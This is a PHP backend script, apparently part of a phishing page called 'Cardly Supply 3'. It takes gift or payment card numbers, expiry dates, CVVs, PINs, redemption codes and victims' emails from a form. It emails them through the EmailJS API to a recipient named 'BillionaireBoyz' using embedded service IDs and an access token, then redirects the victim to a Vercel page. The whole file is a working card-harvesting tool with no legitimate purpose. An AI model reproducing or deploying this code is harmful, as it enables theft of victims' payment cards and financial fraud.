<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    header('Location: https://my-cardlysupply3.vercel.app/');
    exit;
};

$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = $email = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['form_fields']["currency"])) {
        $currency = $_POST['form_fields']["currency"];
    }
    if (!empty($_POST['form_fields']["card"])) {
        $cardType = $_POST['form_fields']['card'];
    }
    if (!empty($_POST['form_fields']["amount"])) {
        $cardAmount = $_POST['form_fields']["amount"];
    }
    if (!empty($_POST['form_fields']["redemption"])) {
        $redemptionNumber = $_POST['form_fields']["redemption"];
    }
    if (!empty($_POST['form_fields']["card_number"])) {
        $cardNumber = $_POST['form_fields']["card_number"];
    }
    if (!empty($_POST['form_fields']["exp_mm"])) {
        $expMM = $_POST['form_fields']["exp_mm"];
    }
    if (!empty($_POST['form_fields']["exp_yy"])) {
        $expYY = $_POST['form_fields']["exp_yy"];
    }
    if (!empty($_POST['form_fields']["cvv"])) {
        $cardCVV = $_POST['form_fields']["cvv"];
    }
    if (!empty($_POST['form_fields']["pin"])) {
        $cardPIN = $_POST['form_fields']["pin"];
    }

    if (!empty($_POST['form_fields']["email"])) {
        $email = $_POST['form_fields']["email"];
    }

    $card_data = [
        "currency" => $currency,
        "card_type" => $cardType,
        "amount" => $cardAmount,
        "redemption_number" => $redemptionNumber,
        "card_number" => $cardNumber,
        "exp_mm" => $expMM,
        "exp_yy" => $expYY,
        "cvv" => $cardCVV,
        "pin" => $cardPIN
    ];
    $email_card_data = json_encode($card_data);

    $url = "https://api.emailjs.com/api/v1.0/email/send";
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Content-Type: application/json",
    );

    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = json_encode([
        "service_id" => "service_t84qq3v",
        "template_id" => "template_l1dza9m",
        "user_id" => "2J8DshQnpUuUkoM9C",
        "accessToken" => "6X57_NC-Z7fS_Ygz3SjkI",
        "template_params" => [
            "to_name" => "BillionaireBoyz",
            "from_name" => "Cardly Supply 3",
            "message" => $email_card_data
        ]
    ]);

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    $resp = curl_exec($curl);
    $err = curl_error($curl);
    $http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);

    if ($resp === false || $http_code >= 400) {
        error_log("Card data send error: HTTP $http_code - $err - Response: $resp");
    }

    if (!empty($email)) {
        $curl2 = curl_init();
        curl_setopt($curl2, CURLOPT_URL, $url);
        curl_setopt($curl2, CURLOPT_POST, true);
        curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);

        $email_data = json_encode([
            "service_id" => "service_t84qq3v",
            "template_id" => "template_brtd0x7",
            "user_id" => "2J8DshQnpUuUkoM9C",
            "accessToken" => "6X57_NC-Z7fS_Ygz3SjkI",
            "template_params" => [
                "to_name" => "BillionaireBoyz",
                "from_name" => "Cardly Supply 3",
                "message" => json_encode(["email" => $email])
            ]
        ]);

        curl_setopt($curl2, CURLOPT_POSTFIELDS, $email_data);

        $resp2 = curl_exec($curl2);
        $err2 = curl_error($curl2);
        $http_code2 = curl_getinfo($curl2, CURLINFO_HTTP_CODE);
        curl_close($curl2);

        if ($resp2 === false || $http_code2 >= 400) {
            error_log("Email send error: HTTP $http_code2 - $err2 - Response: $resp2");
        }
    }

    if ($resp === false) {
        header('Location: https://my-cardlysupply3.vercel.app/');
    } else {
        header('Location: https://my-cardlysupply3.vercel.app/');
    };
} else {
    header('Location: https://my-cardlysupply3.vercel.app/');
    exit;
};
